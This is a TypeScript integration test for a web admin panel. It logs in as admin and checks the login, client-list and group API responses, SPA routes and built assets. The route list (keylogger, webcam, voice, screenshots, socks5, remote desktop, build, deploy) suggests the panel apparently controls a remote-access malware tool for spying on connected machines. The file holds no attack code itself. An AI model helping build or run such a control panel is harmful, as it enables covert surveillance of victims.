const BASE = "https://localhost:5173";

let passed = 0;
let failed = 0;
let cookieHeader = "";

function assert(condition: boolean, msg: string) {
  if (!condition) throw new Error("ASSERT: " + msg);
}

async function test(name: string, fn: () => Promise<void>) {
  try {
    await fn();
    console.log(`  PASS  ${name}`);
    passed++;
  } catch (e: any) {
    console.log(`  FAIL  ${name}`);
    console.log(`        ${e.message}`);
    failed++;
  }
}

async function api(method: string, path: string, body?: any) {
  const headers: Record<string, string> = { "Content-Type": "application/json" };
  if (cookieHeader) headers["Cookie"] = cookieHeader;
  const r = await fetch(BASE + path, { method, headers, body: body ? JSON.stringify(body) : undefined });
  // Capture Set-Cookie
  const setCookie = r.headers.get("set-cookie");
  if (setCookie) {
    const match = setCookie.match(/^([^=]+)=([^;]+)/);
    if (match) cookieHeader = `${match[1]}=${match[2]}`;
  }
  return r;
}

// ─── API Tests ───────────────────────────────────────────

await test("Login returns ok + user + sets cookie", async () => {
  const r = await api("POST", "/api/login", { user: "admin", pass: "adminadmin" });
  assert(r.ok, "HTTP " + r.status);
  const d = await r.json();
  assert(d.ok === true, "ok !== true");
  assert(d.user?.username === "admin", "username !== admin");
  assert(d.user?.role === "admin", "role !== admin");
  assert(cookieHeader.length > 0, "no cookie set");
  console.log(`        cookie: ${cookieHeader.substring(0, 40)}...`);
});

await test("auth/me returns flat shape with cookie", async () => {
  const r = await api("GET", "/api/auth/me");
  assert(r.ok, "HTTP " + r.status);
  const d = await r.json();
  assert(d.username === "admin", "username !== admin");
  assert(d.role === "admin", "role !== admin");
  assert(typeof d.userId === "number", "userId not number");
  assert(Array.isArray(d.permissions), "permissions not array");
  console.log(`        userId=${d.userId} role=${d.role} perms=${d.permissions.length}`);
});

await test("Clients API returns { items, total, page, pageSize, online }", async () => {
  const r = await api("GET", "/api/clients?page=1&pageSize=5");
  assert(r.ok, "HTTP " + r.status);
  const d = await r.json();
  assert(Array.isArray(d.items), "items not array");
  assert(typeof d.total === "number", "total not number");
  assert(typeof d.page === "number", "page not number");
  assert(typeof d.pageSize === "number", "pageSize not number");
  assert(typeof d.online === "number", "online not number");
  console.log(`        items=${d.items.length} total=${d.total} online=${d.online}`);
});

await test("Client objects have correct field names", async () => {
  const r = await api("GET", "/api/clients?page=1&pageSize=5");
  const d = await r.json();
  if (d.items.length > 0) {
    const c = d.items[0];
    assert("host" in c, "missing 'host' (has hostname? " + ("hostname" in c) + ")");
    assert("user" in c, "missing 'user' (has username? " + ("username" in c) + ")");
    assert("online" in c, "missing 'online' (has status? " + ("status" in c) + ")");
    assert("id" in c, "missing 'id'");
    assert("os" in c, "missing 'os'");
    assert("lastSeen" in c, "missing 'lastSeen'");
    console.log(`        host="${c.host}" user="${c.user}" online=${c.online}`);
  } else {
    console.log("        (no clients)");
  }
});

await test("Groups API returns { groups: [...] }", async () => {
  const r = await api("GET", "/api/groups");
  assert(r.ok, "HTTP " + r.status);
  const d = await r.json();
  assert("groups" in d, "missing 'groups'");
  assert(Array.isArray(d.groups), "groups not array");
  console.log(`        ${d.groups.length} groups`);
});

// ─── SPA Routing ─────────────────────────────────────────

await test("SPA: /app/ serves Vue index.html", async () => {
  const r = await fetch(BASE + "/app/");
  assert(r.ok, "HTTP " + r.status);
  const html = await r.text();
  assert(html.includes('<div id="app">'), "missing #app mount point");
  assert(html.includes(".js"), "missing JS");
});

const SPA_ROUTES = [
  "/app/login", "/app/settings", "/app/console/test", "/app/rd/test",
  "/app/backstage/test", "/app/files/test", "/app/processes/test",
  "/app/metrics", "/app/logs", "/app/users",
  "/app/notifications", "/app/scripts", "/app/socks5", "/app/plugins",
  "/app/build", "/app/purgatory", "/app/screenshots", "/app/keylogger/test",
  "/app/webcam/test", "/app/voice/test", "/app/deploy", "/app/winre", "/app/sol-publish",
];

await test(`SPA: all ${SPA_ROUTES.length} routes serve index.html`, async () => {
  for (const route of SPA_ROUTES) {
    const r = await fetch(BASE + route);
    assert(r.ok, `${route} HTTP ${r.status}`);
    const html = await r.text();
    assert(html.includes('<div id="app">'), `${route} missing #app`);
  }
  console.log(`        all ${SPA_ROUTES.length} routes OK`);
});

await test("Old UI at / still works", async () => {
  const r = await fetch(BASE + "/");
  assert(r.ok, "HTTP " + r.status);
  const html = await r.text();
  assert(html.toLowerCase().includes("goylord"), "missing goylord text");
});

// ─── Assets ──────────────────────────────────────────────

await test("Built JS and CSS bundles are served", async () => {
  const r = await fetch(BASE + "/app/");
  const html = await r.text();
  const jsMatch = html.match(/src="(\/app\/assets\/[^"]*\.js)"/);
  assert(!!jsMatch, "no JS asset");
  const jsResp = await fetch(BASE + jsMatch![1]);
  assert(jsResp.ok, "JS not served: " + jsResp.status);
  const jsBuf = await jsResp.arrayBuffer();
  assert(jsBuf.byteLength > 10000, "JS too small: " + jsBuf.byteLength);

  const cssMatch = html.match(/href="(\/app\/assets\/[^"]*\.css)"/);
  assert(!!cssMatch, "no CSS asset");
  const cssResp = await fetch(BASE + cssMatch![1]);
  assert(cssResp.ok, "CSS not served: " + cssResp.status);
  const cssBuf = await cssResp.arrayBuffer();
  assert(cssBuf.byteLength > 1000, "CSS too small: " + cssBuf.byteLength);
  console.log(`        JS=${(jsBuf.byteLength/1024).toFixed(0)}KB CSS=${(cssBuf.byteLength/1024).toFixed(0)}KB`);
});

// ─── Summary ─────────────────────────────────────────────

console.log(`\n${passed} passed, ${failed} failed out of ${passed + failed}`);
if (failed > 0) process.exit(1);
